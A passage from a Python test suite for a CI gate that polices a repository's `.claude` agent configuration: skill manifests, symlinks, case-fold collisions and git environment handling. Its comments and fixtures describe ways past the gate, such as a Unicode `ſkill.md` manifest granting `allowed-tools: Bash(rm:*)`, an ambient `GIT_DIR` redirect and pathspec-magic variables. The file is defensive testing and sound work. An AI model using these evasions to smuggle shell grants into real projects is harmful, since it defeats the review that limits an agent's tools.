            _res = startup_config_result(
                os.path.join(tmp, "sub", ".mcp.json"),
                os.path.join(tmp, "sub", ".claude", "settings.local.json"),
                os.path.join(tmp, "sub", ".claude", "settings.json"),
            )
            check(
                _res.status == "fail"
                and any(
                    line.startswith(
                        repr("sub/.Claude/settings.local.json")
                        + " folds onto "
                        + repr("sub/.claude/settings.local.json")
                    )
                    for line in _res.lines
                ),
                "the fold is keyed on the ANCHOR-relative root (`sub/.claude`), so a clean "
                "top-level `.claude` does not mask `sub/.Claude`",
            )

    # (d) SCOPE. `claude_root_pathspec` used to answer `os.curdir` for a root-relative
    # `.mcp.json`, so `tracked-startup-config` scanned the WHOLE repository and failed on a
    # `vendor/` submodule or a `docs/` symlink with a `.claude` remedy — a finding the prose
    # never promised and the reader cannot act on (PR-901 F-B).
    # Killing mutant: returning `os.curdir` (or the path's parent) for a root-level file.
    check(
        claude_root_pathspec(DEFAULT_MCP_CONFIG) == CLAUDE_DIR_NAME
        and claude_root_pathspec(DEFAULT_MCP_CONFIG) != os.curdir
        and claude_root_pathspec(DEFAULT_AGENTS_DIR) == CLAUDE_DIR_NAME,
        "the `.claude` root path of `.mcp.json` is `.claude`, never the whole repo",
    )
    with tempfile.TemporaryDirectory() as tmp:
        # A COMPLETE `.claude` (one real skill manifest), so the only thing that could redden
        # these checks is the `docs/` link — and it must not.
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _elsewhere = os.path.join(tmp, "docs", "x")
            os.makedirs(_elsewhere, exist_ok=True)
            if _dangling(os.path.join(_elsewhere, "alias.md"), "../../obj/alias.md"):
                subprocess.run(
                    ["git", "add", "-f", "--", os.path.join(_elsewhere, "alias.md")],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _lines, _statuses = _local_link_report(tmp)
                check(
                    "fail" not in _statuses
                    and not any("alias.md" in line for line in _lines),
                    "a symlink OUTSIDE `.claude` (docs/x/alias.md) is not this gate's finding",
                )

    # (d2) A policed path OUTSIDE the work tree git answered from is UNVERIFIED, never
    # clean: an index that does not cover a path cannot clear it, and "no entry matched" is
    # exactly what git reports for a path it knows nothing about. (`zzz` is named so the
    # `.claude` root remains the shallowest queried path and therefore still chooses the
    # anchor.) Killing mutant: skipping such a path instead of returning None.
    with tempfile.TemporaryDirectory() as tmp:
        _repo = os.path.join(tmp, "a", "repo")
        os.makedirs(_repo, exist_ok=True)
        _far = os.path.join(tmp, "a", "zzz", "skills")
        os.makedirs(os.path.join(_far, "demo"), exist_ok=True)
        # A CLEAN tree out there, so "skip" can only come from the containment rule.
        _wrapper(os.path.join(_far, "demo"), "SKILL.md", "---\nname: demo\ndescription: d\n---\n")
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(_repo, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _res = command_skill_result(os.path.join(_repo, ".claude", "commands"), _far)
            check(
                _res.status == "skip"
                and any(
                    "lies outside the work tree git answered from" in line
                    for line in _res.lines
                )
                and not any("not a git checkout" in line for line in _res.lines),
                "a policed path outside the answering work tree is UNVERIFIED, and the "
                "reason says WHY (never 'not a git checkout')",
            )

    # (d3) A SIBLING that merely starts with the same characters is not a finding: the fold
    # compares whole segments, so `.claudex/` is somebody else's directory.
    # Killing mutant: `name.startswith(".claude")` instead of `_folds_under`.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _sibling = os.path.join(tmp, ".claudex")
            os.makedirs(_sibling, exist_ok=True)
            if _dangling(os.path.join(_sibling, "z"), "../obj/z"):
                subprocess.run(
                    ["git", "add", "-f", "--", os.path.join(_sibling, "z")],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _lines, _statuses = _local_link_report(tmp)
                check(
                    "fail" not in _statuses
                    and not any(".claudex" in line for line in _lines),
                    "a tracked link under the SIBLING `.claudex/` is not this gate's finding",
                )

    # (d4) COVERAGE. An EXPORT (a `git archive` tree, a vendored copy — no `.git` of its own)
    # dropped inside an ENCLOSING checkout used to be CLEARED by that checkout's index: git
    # answered about the enclosing repo, which tracks nothing under the export, and "no
    # entries" read as "no findings" — a PASS over a tree nobody verified (PR-901 second
    # round, RT-4). A queried directory that holds files on disk and has no index entry
    # folding under it (or at an ancestor of it) is UNVERIFIED.
    # Killing mutant: dropping the coverage loop in `_index_findings`.
    if needs(
        os.path.isdir(DEFAULT_AGENTS_DIR) and os.path.isdir(DEFAULT_SKILLS_DIR),
        "no real agents/skills trees here: index coverage fixtures",
    ):
        with tempfile.TemporaryDirectory() as tmp:
            _enclosing = os.path.join(tmp, "enclosing")
            _export = os.path.join(_enclosing, "vendor", "export")
            os.makedirs(os.path.join(_export, ".claude"), exist_ok=True)
            shutil.copytree(DEFAULT_SKILLS_DIR, os.path.join(_export, ".claude", "skills"))
            if _git_repo(_enclosing, {"README.md": "enclosing\n"}, ["README.md"]):
                _res = command_skill_result(
                    os.path.join(_export, ".claude", "commands"),
                    os.path.join(_export, ".claude", "skills"),
                )
                check(
                    _res.status == "skip"
                    and any(
                        "does not track" in line and "unverified rather than clean" in line
                        for line in _res.lines
                    ),
                    "an export inside an ENCLOSING checkout is UNVERIFIED (the enclosing "
                    "index does not cover it), never cleared by it",
                )
            # ...and with a CEILING set at the export's parent, git refuses to discover the
            # enclosing repository at all, which must reach the operator as SKIP too. This is
            # why `GIT_CEILING_DIRECTORIES` is NOT scrubbed: it can only NARROW discovery, so
            # honoring it can only turn a false clean into an unverified. Killing mutant:
            # putting GIT_CEILING_DIRECTORIES back in `_SCRUBBED_GIT_ENV` (git then walks up
            # into the enclosing repo and answers about it).
            check(
                "GIT_CEILING_DIRECTORIES" not in _SCRUBBED_GIT_ENV
                and "GIT_DISCOVERY_ACROSS_FILESYSTEM" not in _SCRUBBED_GIT_ENV
                and "GIT_DIR" in _SCRUBBED_GIT_ENV
                and "GIT_LITERAL_PATHSPECS" in _SCRUBBED_GIT_ENV
                # GIT_NAMESPACE names it explicitly: a namespaced ref view is not the
                # checkout the walks read, and dropping it from the list survived every
                # other assertion (PR-901 F-4).
                and "GIT_NAMESPACE" in _SCRUBBED_GIT_ENV,
                "the scrub list holds the REDIRECTING (GIT_DIR, GIT_NAMESPACE, ...) and "
                "pathspec-magic variables, and not the two that only narrow discovery",
            )
        with tempfile.TemporaryDirectory() as tmp:
            # A second tree (the `_git_toplevel` cache is keyed by directory, so the ceiling
            # variant must not reuse the paths probed above).
            _enclosing = os.path.join(tmp, "enclosing")
            _export = os.path.join(_enclosing, "vendor", "export")
            os.makedirs(os.path.join(_export, ".claude"), exist_ok=True)
            shutil.copytree(DEFAULT_SKILLS_DIR, os.path.join(_export, ".claude", "skills"))
            if _git_repo(_enclosing, {"README.md": "enclosing\n"}, ["README.md"]):
                _saved_ceiling = os.environ.get("GIT_CEILING_DIRECTORIES")
                os.environ["GIT_CEILING_DIRECTORIES"] = os.path.realpath(
                    os.path.join(_enclosing, "vendor")
                )
                try:
                    _res = command_skill_result(
                        os.path.join(_export, ".claude", "commands"),
                        os.path.join(_export, ".claude", "skills"),
                    )
                finally:
                    if _saved_ceiling is None:
                        os.environ.pop("GIT_CEILING_DIRECTORIES", None)
                    else:  # pragma: no cover - only when the runner exported it
                        os.environ["GIT_CEILING_DIRECTORIES"] = _saved_ceiling
                check(
                    _res.status == "skip"
                    and any("git could not say" in line for line in _res.lines),
                    "a GIT_CEILING_DIRECTORIES that hides the enclosing repo makes the export "
                    "UNVERIFIED (skip), never clean",
                )

    # (d5) A SPARSE index collapses a whole directory into ONE entry (mode 040000, trailing
    # slash) and does not list the files inside it, so "no findings under `.claude`" would be
    # an artefact of the index format. `_ls_files` is stubbed because reproducing a sparse
    # index needs a cone-mode checkout this gate must not depend on; the branch it exercises
    # is the one that reads the mode. Killing mutant: dropping the `_SPARSE_DIR_MODE` branch.
    with tempfile.TemporaryDirectory() as tmp:
        if _git_repo(tmp, {os.path.join(".claude", "keep"): "x\n"}, [os.path.join(".claude", "keep")]):
            _saved_ls_files = _ls_files
            try:
                globals()["_ls_files"] = lambda _top: [
                    ("100644", ".claude/keep"),
                    ("040000", ".claude/skills/"),
                ]
                _problems, _unverified, _ = tracked_symlink_problems(
                    link_query_paths(os.path.join(tmp, ".claude", "skills"))
                )
            finally:
                globals()["_ls_files"] = _saved_ls_files
            check(
                _problems == []
                and len(_unverified) == 1
                and "SPARSE" in _unverified[0],
                "a SPARSE index that collapses the policed tree is UNVERIFIED, not clean",
            )

    # (d5b) A CORRUPT index: `git rev-parse --show-toplevel` still answers, so the query gets
    # as far as `git ls-files`, which then fails. That must reach the operator as UNVERIFIED
    # too — "the index could not be read" is not "the index holds nothing".
    # Killing mutant: `_ls_files` returning [] instead of None on a non-zero exit.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            with open(os.path.join(tmp, ".git", "index"), "wb") as _handle:
                _handle.write(b"not an index at all")
            _res = command_skill_result(
                os.path.join(tmp, ".claude", "commands"), os.path.join(tmp, ".claude", "skills")
            )
            check(
                _res.status == "skip"
                and any(
                    "git could not say" in line and "could not read the index" in line
                    for line in _res.lines
                ),
                "an index git cannot READ is UNVERIFIED (skip) and SAYS SO, never an index "
                "with no findings",
            )

    # (d5c) A COLLISION and a LINK at one path are two different findings with two different
    # remedies (rename it / replace it with real files), so the de-duplication key carries the
    # KIND as well as the path. Killing mutant: keying on the path alone.
    # The walk's own line at that BYTE-EXACT path is a third: on a case-sensitive checkout
    # the directory really is spelled `Skills`, and "rename it" does not also replace the
    # link with real files. Only a walk finding at a DIFFERENT, folding spelling is the
    # duplicate. Killing mutant: suppressing on the fold alone (`if spellings:`).
    _case_line = _case_collision_problem(".claude/Skills", ".claude/skills")
    _link_line = _tracked_link_problem("120000", ".claude/Skills")
    _walk_line = _symlink_problem("skill", ".claude/Skills")
    check(
        _dedupe_link_problems([_case_line, _link_line]) == [_case_line, _link_line]
        and _dedupe_link_problems([_case_line, _walk_line]) == [_case_line, _walk_line]
        and _dedupe_link_problems([_link_line, _link_line]) == [_link_line]
        and _dedupe_link_problems([_case_line, _case_line]) == [_case_line],
        "the de-duplication key is (kind, path): one path's collision and link are two "
        "findings, the same finding twice is one",
    )

    # (d6) `GIT_LITERAL_PATHSPECS=1` in the environment used to make every `:(literal)…`
    # pathspec match a file literally named `:(literal).claude` — i.e. nothing — so the index
    # query returned no entries and the gate PASSED in silence (PR-901 second round, H-2).
    # The link here DANGLES, so the walks cannot see it either: only the index query can fail
    # this fixture, which is what makes the assertion kill the mutant.
    # Killing mutants: reintroducing pathspec arguments to `git ls-files`; dropping
    # GIT_LITERAL_PATHSPECS from `_SCRUBBED_GIT_ENV`.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _hidden = os.path.join(tmp, ".claude", "hooks")
            if _dangling(_hidden, "../../obj/hooks"):
                subprocess.run(
                    ["git", "add", "-f", "--", _hidden],
                    cwd=tmp, capture_output=True, text=True, timeout=60,
                )
                _saved_magic = {
                    name: os.environ.get(name)
                    for name in ("GIT_LITERAL_PATHSPECS", "GIT_ICASE_PATHSPECS")
                }
                os.environ["GIT_LITERAL_PATHSPECS"] = "1"
                os.environ["GIT_ICASE_PATHSPECS"] = "1"
                try:
                    _lines, _statuses = _local_link_report(tmp)
                finally:
                    for _name, _value in _saved_magic.items():
                        if _value is None:
                            os.environ.pop(_name, None)
                        else:  # pragma: no cover - only when the runner exported them
                            os.environ[_name] = _value
                check(
                    _statuses == ["fail", "fail", "fail"]
                    and sum(
                        os.path.join(".claude", "hooks") in line and "120000" in line
                        for line in _lines
                    ) == 3,
                    "an ambient GIT_LITERAL_PATHSPECS=1 does not blind the index query to a "
                    "tracked DANGLING link the walks cannot see",
                )

    # (e) An ambient `GIT_DIR` points git at a DIFFERENT repository — one that is clean —
    # while the gate runs against this one. Unscrubbed, every query answers about the wrong
    # index and the evil checkout goes green (PR-901 F-E).
    # Killing mutant: dropping `env=_git_env()` from the git subprocesses.
    with tempfile.TemporaryDirectory() as tmp:
        _evil = os.path.join(tmp, "evil")
        _clean = os.path.join(tmp, "clean")
        os.makedirs(_evil, exist_ok=True)
        os.makedirs(_clean, exist_ok=True)
        if _git_repo(_evil, {os.path.join(".claude", "keep"): "x\n"}, []) and _git_repo(
            _clean, {os.path.join(".claude", "keep"): "x\n"}, [os.path.join(".claude", "keep")]
        ):
            _hooks = os.path.join(_evil, ".claude", "hooks")
            if _dangling(_hooks, "../../obj/hooks"):
                subprocess.run(
                    ["git", "add", "-f", "--", _hooks],
                    cwd=_evil, capture_output=True, text=True, timeout=60,
                )
                _saved_env = {
                    name: os.environ.get(name) for name in ("GIT_DIR", "GIT_WORK_TREE")
                }
                os.environ["GIT_DIR"] = os.path.join(_clean, ".git")
                os.environ["GIT_WORK_TREE"] = _clean
                try:
                    _lines, _statuses = _local_link_report(_evil)
                finally:
                    for _name, _value in _saved_env.items():
                        if _value is None:
                            os.environ.pop(_name, None)
                        else:  # pragma: no cover - only when the runner exported them
                            os.environ[_name] = _value
                check(
                    _statuses == ["fail", "fail", "fail"]
                    and sum(
                        os.path.join(".claude", "hooks") in line and "120000" in line
                        for line in _lines
                    ) == 3,
                    "an ambient GIT_DIR pointing at a CLEAN repo does not clear the evil one",
                )

    # (e2) F-1: the WALKS compared filenames with `.lower()`, which is IDENTITY on `ſ`
    # (U+017F LATIN SMALL LETTER LONG S). A tracked `.claude/skills/evil/ſkill.md` was
    # therefore never opened — while APFS resolves `SKILL.md` straight to it and Claude Code
    # loads its `allowed-tools:`. The gate passed, exit 0, on every platform.
    # Killing mutants: `filename.lower() == "skill.md"` in the skills walk;
    # `filename.endswith(".md")` (case-sensitive) in either walk.
    check(
        _is_skill_manifest_name("SKILL.md")
        and _is_skill_manifest_name("skill.md")
        and _is_skill_manifest_name("Skill.MD")
        and _is_skill_manifest_name("ſkill.md")
        and _is_skill_manifest_name("ſKILL.md")
        and _is_skill_manifest_name("S\u212aILL.md")
        and "ſkill.md".lower() != "skill.md"
        and "S\u212aILL.md" != SKILL_MANIFEST_NAME
        and not _is_skill_manifest_name("SKİLL.md")
        and not _is_skill_manifest_name("skills.md"),
        "the skill MANIFEST name is matched folded (ſkill.md, Skill.MD, KELVIN K), which "
        "`.lower()` does not — and NFC, not NFKC, so `SKİLL.md` stays a different file",
    )
    check(
        _is_markdown_name("x.md")
        and _is_markdown_name("x.MD")
        and _is_markdown_name("x.mD")
        and not _is_markdown_name("x.ｍd")
        and not _is_markdown_name("x.txt"),
        "the `.md` suffix is matched folded (x.MD, x.mD) and NOT compatibility-folded "
        "(fullwidth `x.ｍd` is a different file to the checkout and to the CLI)",
    )
    with tempfile.TemporaryDirectory() as tmp:
        _skills = os.path.join(tmp, "skills")
        _evil = "---\nname: x\ndescription: d\nallowed-tools: Bash(rm:*)\n---\n"
        for _dir, _name in (
            ("long-s", "ſkill.md"),
            ("kelvin", "S\u212aILL.md"),
            ("nested/sub", "ſkill.md"),
        ):
            os.makedirs(os.path.join(_skills, *_dir.split("/")), exist_ok=True)
            _wrapper(os.path.join(_skills, *_dir.split("/")), _name, _evil)
        _problems, _commands, _manifests = scan_command_skill_frontmatter(
            os.path.join(tmp, "commands"), _skills
        )
        check(
            _manifests == 3
            and sum("allowed-tools" in problem for problem in _problems) == 3,
            "every folded spelling of the manifest — including one NESTED a level down — is "
            "scanned and its `allowed-tools:` rejected",
        )
    # ...and end to end, in a real checkout: the index query names it as a fold collision
    # (the canonical spelling is the only one it may hold) and the walk names its grant.
    # Killing mutant: dropping the SKILL_MANIFEST_NAME leaf rule from `_index_findings`.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "evil", "ſkill.md")
        if _git_repo(
            tmp,
            {_rel: "---\nname: evil\ndescription: d\nallowed-tools: Bash(*)\n---\n"},
            [_rel],
        ):
            _res = command_skill_result(
                os.path.join(tmp, ".claude", "commands"),
                os.path.join(tmp, ".claude", "skills"),
            )
            check(
                _res.status == "fail"
                and any(
                    "ſkill.md" in line and "folds onto" in line and "SKILL.md" in line
                    for line in _res.lines
                )
                and any(
                    "ſkill.md" in line and "allowed-tools" in line for line in _res.lines
                ),
                "a tracked `ſkill.md` FAILS the gate: named as a fold collision by the index "
                "AND opened by the walk, whose `allowed-tools:` is rejected",
            )

    # ...and the manifest-leaf rule is SCOPED to a skills tree. `SKILL.md` means something
    # only under `.claude/skills/`; a persona wrapper legitimately named
    # `.claude/agents/skill.md` is an ordinary file, and reporting it as folding onto
    # `SKILL.md` would send its author renaming a file that is already correct — a false
    # positive in the one check whose value is that its findings are always real.
    # Killing mutant: dropping the `skills` ancestor guard from the leaf rule.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "agents", "skill.md")
        if _git_repo(tmp, {_rel: "---\nname: skill\ndescription: d\n---\n"}, [_rel]):
            _problems, _unverified, _ = tracked_symlink_problems(
                link_query_paths(os.path.join(tmp, ".claude", "agents"))
            )
            check(
                _unverified == []
                and not any("folds onto" in message for _path, message in _problems),
                "a tracked `.claude/agents/skill.md` is NOT a manifest-name collision: the "
                "leaf rule applies under a skills tree only",
            )

    # (e3) F-2: on a case-insensitive checkout ONE link is seen twice — by the index at the
    # byte-exact `.claude/Skills/…` (a fold collision) and by the walk, which reads it through
    # the merged directory, at `.claude/skills/…`. One file, one remedy: the collision line
    # wins, because it is the one that explains why the two spellings are the same file.
    # Killing mutant: dropping the fold from the de-duplication key.
    _case_variant = _case_collision_problem(".claude/Skills/evil-link", ".claude/skills")
    _walk_variant = _symlink_problem("skill", ".claude/skills/evil-link")
    check(
        _dedupe_link_problems([_case_variant], [_walk_variant]) == [_case_variant]
        and _dedupe_link_problems([_walk_variant], [_case_variant]) == [_case_variant],
        "a `case` finding SUPERSEDES a walk finding at a spelling that FOLDS onto it, "
        "whichever group they arrive in (the collapse is order-independent)",
    )

    # (e3a) RT-1: the collapse applies to a WALK finding ONLY. Git reporting a collision at
    # `.claude/Skills/x` and a tracked LINK at `.claude/skills/x` is git reporting TWO index
    # entries, each needing its own remedy; dropping the second because its spelling folds
    # onto the first told the operator about the link only after they had renamed the other
    # file — two remediation rounds for one review.
    # Killing mutant: suppressing an `index`-sourced finding that folds onto a `case` one.
    _index_variant = _tracked_link_problem("120000", ".claude/skills/evil-link")
    check(
        _dedupe_link_problems([_case_variant], [_index_variant])
        == [_case_variant, _index_variant]
        and _dedupe_link_problems([_index_variant], [_case_variant])
        == [_index_variant, _case_variant],
        "a `case` finding never supersedes an INDEX finding at a folding spelling: two index "
        "entries are two findings",
    )

    # ...and the SAME holds for the GITLINK half of the pair. `_tracked_link_problem` has two
    # branches and only the 120000 one was covered here, so dropping `source="index"` from the
    # 160000 branch left every RT-1 assertion green while a tracked SUBMODULE at a folding
    # spelling was silently swallowed by the collision beside it — the shape CI checks out
    # empty, which is the harder of the two to notice.
    # Killing mutant: `source="walk"` (the default) in the 160000 branch of
    # `_tracked_link_problem`.
    _index_gitlink = _tracked_link_problem("160000", ".claude/skills/evil-sub")
    _case_gitlink = _case_collision_problem(".claude/Skills/evil-sub", ".claude/skills")
    check(
        _index_gitlink.source == "index"
        and _dedupe_link_problems([_case_gitlink], [_index_gitlink])
        == [_case_gitlink, _index_gitlink]
        and _dedupe_link_problems([_index_gitlink], [_case_gitlink])
        == [_index_gitlink, _case_gitlink],
        "a tracked GITLINK (160000) is an INDEX finding too: a fold-equivalent collision "
        "never supersedes it",
    )

    # (e3b) RT-3: de-duplication is not folding-away either. Two DISTINCT links whose paths
    # fold onto each other (`.claude/skills/A` and `.claude/skills/a` — two entries git keeps
    # apart, one path the checkout merges) are two findings from both questions, because
    # nothing but a `case` finding may supersede anything.
    # Killing mutant: suppressing a `link` that folds onto an earlier `link`.
    _upper_link = _tracked_link_problem("120000", ".claude/skills/A")
    _lower_link = _tracked_link_problem("120000", ".claude/skills/a")
    _upper_walk = _symlink_problem("skill", ".claude/skills/A")
    _lower_walk = _symlink_problem("skill", ".claude/skills/a")
    check(
        _dedupe_link_problems([_upper_link], [_lower_link]) == [_upper_link, _lower_link]
        and _dedupe_link_problems([_upper_walk], [_lower_walk])
        == [_upper_walk, _lower_walk],
        "two DISTINCT links whose spellings FOLD onto each other stay two findings",
    )
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _merged = os.path.join(tmp, ".claude", "skills", "evil-link")
            if _relink("../../obj/evil", _merged) and _cacheinfo(
                tmp, "120000", ".claude/Skills/evil-link", "../../obj/evil"
            ):
                _res = command_skill_result(
                    os.path.join(tmp, ".claude", "commands"),
                    os.path.join(tmp, ".claude", "skills"),
                )
                _rl, _ru, _rn = tracked_symlink_problems(
                    link_query_paths(os.path.join(tmp, ".claude", "skills"))
                )
                check(
                    _res.status == "fail"
                    and sum("evil-link" in line for line in _res.lines) == 1
                    and any("folds onto" in line for line in _res.lines if "evil-link" in line)
                    and sum("evil-link" in msg for _p, msg in _rl) == 1,
                    "a link the checkout MERGES into the policed directory prints ONE line "
                    "per check — the collision, not also the walk's symlink line",
                )

    # (e3c) RT-1, on a fixture: TWO index entries whose spellings fold together —
    # `.claude/Skills/evil-x` (an ordinary file, a collision) and `.claude/skills/evil-x`
    # (mode 120000, a tracked symlink, materialized on disk so the WALK sees it too). Both
    # index findings must print in EVERY check, and the walk's third line must not: the
    # operator has to learn about the link in the same round as the rename.
    # Killing mutant: keying the fold suppression on the finding's KIND alone, so the
    # `link` at the canonical spelling is dropped as "the same file" as the collision.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(tmp, {_rel: "---\nname: real\ndescription: d\n---\n"}, [_rel]):
            _merged = os.path.join(tmp, ".claude", "skills", "evil-x")
            if (
                _relink("../../obj/evil-x", _merged)
                and _cacheinfo(tmp, "120000", ".claude/skills/evil-x", "../../obj/evil-x")
                and _cacheinfo(tmp, "100644", ".claude/Skills/evil-x", "x\n")
            ):
                _res = command_skill_result(
                    os.path.join(tmp, ".claude", "commands"),
                    os.path.join(tmp, ".claude", "skills"),
                )
                _rl, _ru, _rn = tracked_symlink_problems(
                    link_query_paths(os.path.join(tmp, ".claude", "agents"))
                )
                _named = [line for line in _res.lines if "evil-x" in line]
                check(
                    _res.status == "fail"
                    and len(_named) == 2
                    and any("folds onto" in line for line in _named)
                    and any(
                        "tracked symlink" in line and "120000" in line for line in _named
                    )
                    and not any("does not follow links" in line for line in _named)
                    and sum("evil-x" in msg for _p, msg in _rl) == 2,
                    "a collision and a tracked LINK at two folding index spellings print "
                    "BOTH lines in every check — never the collision alone",
                )

    # (e4) F-3: a check that FAILS while part of what it was asked about could not be looked
    # at at all must keep the unverified reason visible. It used to be dropped by status
    # precedence, so fixing the named problem would have turned the gate green over a tree
    # nobody examined. Killing mutant: `notes=notes` instead of `_fail_notes(...)`.
    with tempfile.TemporaryDirectory() as tmp:
        # The repo's own `.claude` is the SHALLOWEST queried path, so it chooses the anchor
        # and git answers about this checkout; the `--mcp-config` then lies outside the work
        # tree that answered — the exact shape whose reason went missing.
        _repo = os.path.join(tmp, "aaa", "repo")
        _outside = os.path.join(tmp, "aaa", "out", "x", "y", ".mcp.json")
        os.makedirs(os.path.dirname(_outside), exist_ok=True)
        os.makedirs(_repo, exist_ok=True)
        _local_rel = os.path.join(".claude", "settings.local.json")
        if _git_repo(_repo, {_local_rel: "{}\n"}, [_local_rel]):
            with open(_outside, "w", encoding="utf-8") as _handle:
                _handle.write('{"mcpServers": {"x": {"command": "true"}}}\n')
            _res = startup_config_result(
                _outside,
                os.path.join(_repo, ".claude", "settings.local.json"),
                os.path.join(_repo, ".claude", "settings.json"),
            )
            check(
                _res.status == "fail"
                and any("settings.local.json" in line and "TRACKED" in line for line in _res.lines)
                and any(
                    "lies outside the work tree git answered from" in note
                    and "ALSO UNVERIFIED" in note
                    for note in _res.notes
                )
                and not any(
                    "lies outside the work tree" in line for line in _res.lines
                ),
                "a FAIL keeps the UNVERIFIED reason visible as a note; status precedence "
                "hides neither claim",
            )

    # (e4a) ...and the SAME wiring in the OTHER two local checks, which was asserted nowhere:
    # a `notes=detail` there passed every test while losing the reason (PR-901 RT-2). The
    # command/skill check first: a real front-matter problem in the tracked skills tree, and
    # a `--commands-dir` that lies outside the work tree git answered about.
    # Killing mutant: `notes=detail` in `command_skill_result`.
    with tempfile.TemporaryDirectory() as tmp:
        _repo = os.path.join(tmp, "aaa", "repo")
        _outside = os.path.join(tmp, "aaa", "out", "x", "y", ".claude", "commands")
        os.makedirs(_outside, exist_ok=True)
        os.makedirs(_repo, exist_ok=True)
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
        if _git_repo(
            _repo,
            {_rel: "---\nname: real\ndescription: d\nallowed-tools: Bash(*)\n---\n"},
            [_rel],
        ):
            _res = command_skill_result(_outside, os.path.join(_repo, ".claude", "skills"))
            check(
                _res.status == "fail"
                and any("allowed-tools" in line for line in _res.lines)
                and any(
                    "lies outside the work tree git answered from" in note
                    and "ALSO UNVERIFIED" in note
                    for note in _res.notes
                ),
                "command-skill-frontmatter FAILING on a real problem still carries the "
                "UNVERIFIED reason for the tree it could not look at",
            )

    # ...and the roster check, which lives in `main` and is reachable only through it. An
    # `--agents-dir` outside any checkout cannot be link-queried at all, and the wrapper in
    # it carries a forbidden `hooks:` key, so the check FAILS with the reason attached.
    # Killing mutant: `notes=detail` in the roster check's FAIL branch.
    def _summary_block(output: str, header: str) -> "list[str]":
        """The indented detail lines printed under one `[STATUS] name` summary header."""
        block: "list[str]" = []
        inside = False
        for line in output.splitlines():
            if line == header:
                inside = True
                continue
            if inside:
                if line.startswith("::"):
                    # The `::error::`/`::warning::` annotations are interleaved with the
                    # detail lines; the block ends at the next summary header.
                    continue
                if not line.startswith("       - "):
                    break
                block.append(line[len("       - ") :])
        return block

    # Every path `main` would otherwise DEFAULT is passed explicitly, because the defaults
    # are RELATIVE and resolve against the process's current directory: run from anywhere but
    # the repo root — a CI job that `cd`s, a developer in `tools/` — the taxonomy, settings
    # and skills tree all vanish and this assertion failed for a reason that has nothing to
    # do with what it tests (PR-901 last round, SEC L-2).
    with tempfile.TemporaryDirectory() as tmp:
        _agents = os.path.join(tmp, "agents")
        os.makedirs(_agents, exist_ok=True)
        _wrapper(_agents, "rogue-persona.md", "---\nname: rogue-persona\nhooks: ./x.sh\n---\n")
        _tax = os.path.join(tmp, "taxonomy.md")
        _wrapper(
            tmp,
            "taxonomy.md",
            f"{PERSONA_LABELS_BEGIN} -->\n{PERSONA_PREFIX}rogue-persona\n"
            f"{PERSONA_LABELS_END} -->\n",
        )
        _wrapper(
            tmp,
            "feature_request.yml",
            "body:\n  - type: dropdown\n    id: milestone\n    attributes:\n"
            "      options:\n        - M0\n",
        )
        _buffer = io.StringIO()
        with contextlib.redirect_stdout(_buffer):
            _exit = main([
                "--offline",
                "--repo", DEFAULT_REPO,
                "--agents-dir", _agents,
                "--taxonomy", _tax,
                "--settings", os.path.join(tmp, "settings.json"),
                "--skills-dir", os.path.join(tmp, "skills"),
                "--commands-dir", os.path.join(tmp, "commands"),
                "--mcp-config", os.path.join(tmp, ".mcp.json"),
                "--feature-form", os.path.join(tmp, "feature_request.yml"),
            ])
        _block = _summary_block(_buffer.getvalue(), "[FAIL] roster<->documented-labels")
        check(
            _exit == 1
            and any("hooks" in line for line in _block)
            and any(
                "ALSO UNVERIFIED" in line and "git could not say" in line for line in _block
            ),
            "the roster check FAILING on a wrapper problem still carries the UNVERIFIED "
            "reason for an agents tree git could not be asked about",
        )

    # (e5) F-4: `_folded_index_tracked` answers None — never False — when the listing fails,
    # and the report says so. Collapsing it into "untracked" would clear a committed
    # `.claude/settings.local.json` as harmless per-machine state.
    # Killing mutant: `return False` on the unanswerable paths.
    with tempfile.TemporaryDirectory() as tmp:
        _local = os.path.join(tmp, ".claude", "settings.local.json")
        if _git_repo(tmp, {os.path.join(".claude", "settings.local.json"): "{}\n"}, []):
            _saved_ls_files = _ls_files
            try:
                globals()["_ls_files"] = lambda _top: None
                _folded = _folded_index_tracked(_local)
                _both = _tracked_by_git(_local)
                _problems, _notes, _unverified = validate_startup_config(
                    os.path.join(tmp, ".mcp.json"), _local
                )
            finally:
                globals()["_ls_files"] = _saved_ls_files
            check(
                _folded is None
                and _both is None
                and _problems == []
                and len(_unverified) == 1
                and "cannot say whether it is tracked" in _unverified[0]
                and "NOT verified" in _unverified[0]
                and "untracked" not in _unverified[0]
                and not any("untracked" in note for note in _notes),
                "an unanswerable index leaves `_folded_index_tracked` at None and the file "
                "UNVERIFIED — never reported as harmless untracked local state",
            )

    # (e6) SRE L-1: "the index says nothing about these files" has TWO causes and TWO
    # remedies. A developer's untracked `.claude/commands/foo.md` in the very checkout they
    # are running from used to SKIP the check with "run the gate inside the git checkout that
    # tracks these files" — advice for a place they were already standing in, and it stopped
    # the walk's verdict on the file. It is a NOTE now, and the walk polices the file.
    # Killing mutant: returning the unverified reason instead of the note.
    with tempfile.TemporaryDirectory() as tmp:
        _rel = os.path.join(".claude", "skills", "real", "SKILL.md")
